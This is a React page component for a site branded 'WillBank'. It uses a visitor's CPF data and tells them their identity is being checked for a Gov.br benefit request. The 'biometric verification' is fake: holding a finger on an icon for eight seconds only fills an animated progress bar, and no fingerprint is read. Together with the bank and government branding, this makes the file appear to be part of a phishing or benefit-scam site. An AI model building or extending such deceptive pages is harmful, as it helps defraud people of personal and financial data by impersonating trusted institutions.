import { useEffect, useState, useCallback } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Fingerprint } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";

const Biometria = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);
  const [isPressed, setIsPressed] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
    }
  }, [cpfData, navigate]);

  // Handle progress when finger is pressed
  useEffect(() => {
    if (!isPressed) return;

    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            navigate("/video", { state: { cpfData } });
          }, 500);
          return 100;
        }
        return prev + 2;
      });
    }, 80);

    return () => clearInterval(interval);
  }, [isPressed, cpfData, navigate]);

  const handleStart = useCallback(() => {
    setIsPressed(true);
  }, []);

  const handleEnd = useCallback(() => {
    if (progress < 100) {
      setIsPressed(false);
      setProgress(0);
    }
  }, [progress]);

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
      />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          <div className="space-y-10 text-center py-4">
            <div className="space-y-3">
              <h1 className="text-2xl sm:text-3xl font-bold text-foreground tracking-tight">
                Verificação de identidade
              </h1>
              <p className="text-muted-foreground leading-relaxed">
                Vamos verificar se é realmente <span className="font-bold text-foreground">{cpfData.nome}</span> que está solicitando o benefício no Portal Gov.br
              </p>
            </div>

            {/* Fingerprint Circle */}
            <div 
              className="relative w-44 h-44 mx-auto cursor-pointer select-none group"
              onMouseDown={handleStart}
              onMouseUp={handleEnd}
              onMouseLeave={handleEnd}
              onTouchStart={handleStart}
              onTouchEnd={handleEnd}
            >
              {/* Outer ring with progress */}
              <svg className="absolute inset-0 w-full h-full -rotate-90 drop-shadow-lg">
                <circle
                  cx="88"
                  cy="88"
                  r="82"
                  fill="none"
                  stroke="hsl(var(--primary) / 0.15)"
                  strokeWidth="8"
                />
                <circle
                  cx="88"
                  cy="88"
                  r="82"
                  fill="none"
                  stroke="url(#progressGradient)"
                  strokeWidth="8"
                  strokeLinecap="round"
                  strokeDasharray={`${2 * Math.PI * 82}`}
                  strokeDashoffset={`${2 * Math.PI * 82 * (1 - progress / 100)}`}
                  className="transition-all duration-100"
                />
                <defs>
                  <linearGradient id="progressGradient" x1="0%" y1="0%" x2="100%" y2="0%">
                    <stop offset="0%" stopColor="hsl(var(--primary))" />
                    <stop offset="100%" stopColor="hsl(40, 100%, 55%)" />
                  </linearGradient>
                </defs>
              </svg>
              
              {/* Inner circle with fingerprint */}
              <div className={`absolute inset-5 rounded-full flex items-center justify-center transition-all duration-200 ${isPressed ? 'bg-primary/20 scale-95' : 'bg-muted group-hover:bg-muted/80'}`}>
                <Fingerprint className={`w-20 h-20 transition-all duration-200 ${isPressed ? 'text-primary scale-110' : 'text-muted-foreground/60 group-hover:text-muted-foreground'}`} />
              </div>
            </div>

            <div className="space-y-2">
              <p className="font-bold text-foreground text-lg">
                Mantenha o dedo pressionado
              </p>
              <p className={`text-4xl font-black transition-colors duration-300 ${progress > 0 ? 'text-primary' : 'text-amber-500'}`}>
                {progress}%
              </p>
            </div>

            {/* Instructions */}
            <div className="bg-primary/5 border border-primary/20 rounded-2xl p-5 text-left">
              <p className="font-bold text-foreground mb-2 flex items-center gap-2">
                <span className="text-lg">📋</span> Instruções:
              </p>
              <p className="text-sm text-muted-foreground leading-relaxed">
                Posicione seu dedo sobre o círculo e mantenha pressionado por 8 segundos para completar a verificação biométrica.
              </p>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Biometria;
